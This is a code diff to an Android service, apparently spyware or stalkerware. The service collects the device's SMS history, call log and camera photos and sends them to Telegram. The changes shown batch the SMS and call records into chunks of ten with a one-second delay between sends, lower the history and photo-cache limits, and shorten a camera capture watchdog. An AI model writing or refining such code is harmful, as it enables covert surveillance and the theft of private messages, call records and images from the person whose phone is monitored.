@@ -477,11 +477,11 @@ class MonitoringService : Service() {
         try {
             android.util.Log.i("MonitoringService", "Collecting SMS history...")
             // Get all history first
-            val allSms = smsRepository.getRecentSms(200)
+            val allSms = smsRepository.getRecentSms(100)
             android.util.Log.i("MonitoringService", "Found ${allSms.size} SMS messages")
             
             android.util.Log.i("MonitoringService", "Collecting call history...")
-            val allCalls = callLogRepository.getAllCalls()
+            val allCalls = callLogRepository.getAllCalls(100)
             android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")
 
             preferencesManager.initialSyncDone = true
@@ -599,9 +599,11 @@ class MonitoringService : Service() {
             val newSms = smsRepository.getNewSms(lastSmsId)
             
             if (newSms.isNotEmpty()) {
-                val message = formatSmsMessage(newSms)
-                sendToTelegram(message)
-                
+                newSms.chunked(10).forEachIndexed { index, chunk ->
+                    sendToTelegram(formatSmsMessage(chunk))
+                    if (index < newSms.chunked(10).size - 1) delay(1000)
+                }
+
                 val maxId = newSms.maxOf { it.id }
                 preferencesManager.lastSmsId = maxId
             }
@@ -611,9 +613,11 @@ class MonitoringService : Service() {
             val newCalls = callLogRepository.getNewCalls(lastCallTimestamp)
             
             if (newCalls.isNotEmpty()) {
-                val message = formatCallMessage(newCalls)
-                sendToTelegram(message)
-                
+                newCalls.chunked(10).forEachIndexed { index, chunk ->
+                    sendToTelegram(formatCallMessage(chunk))
+                    if (index < newCalls.chunked(10).size - 1) delay(1000)
+                }
+
                 val maxTimestamp = newCalls.maxOf { it.date }
                 preferencesManager.lastCallTimestamp = maxTimestamp
             }
@@ -786,7 +790,7 @@ class MonitoringService : Service() {
             return
         }
         serviceScope.launch {
-            delay(70_000)
+            delay(50_000)
             if (cameraBusy.compareAndSet(true, false)) {
                 android.util.Log.w("MonitoringService", "Camera watchdog: capture did not finish, flag reset")
                 if (reportResult) {
@@ -950,7 +954,7 @@ class MonitoringService : Service() {
         prunePhotoCache()
     }
 
-    private fun prunePhotoCache(maxKept: Int = 20) {
+    private fun prunePhotoCache(maxKept: Int = 10) {
         try {
             val photos = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
